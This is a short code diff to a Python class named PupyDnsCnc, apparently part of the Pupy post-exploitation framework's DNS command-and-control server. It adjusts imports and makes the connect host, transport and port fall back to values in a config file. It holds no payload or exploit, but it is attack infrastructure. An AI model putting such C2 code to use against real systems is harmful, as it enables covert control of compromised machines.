@@ -1,8 +1,11 @@
 # -*- coding: utf-8 -*-
 
 from PupyCredentials import Credentials
-from network.lib.picocmd import *
+from network.lib.picocmd.server import *
+from network.lib.picocmd.picocmd import *
 from Queue import Queue
+
+from pupylib.PupyConfig import PupyConfig
 
 import requests
 import netifaces
@@ -45,9 +48,13 @@ class PupyDnsCnc(object):
         ):
 
         credentials = Credentials()
+        config = PupyConfig()
+
+        connect_host = connect_host or config.getip('pupyd', 'address')
+
         self.igd = igd
-        self.transport = connect_transport
-        self.port = int(connect_port)
+        self.transport = connect_transport or config.get('pupyd', 'transport')
+        self.port = int(connect_port  or config.getint('pupyd', 'port'))
         self.host = [ connect_host ] if connect_host else self._all_ip()
         self.dns_domain = domain
         self.dns_port = port
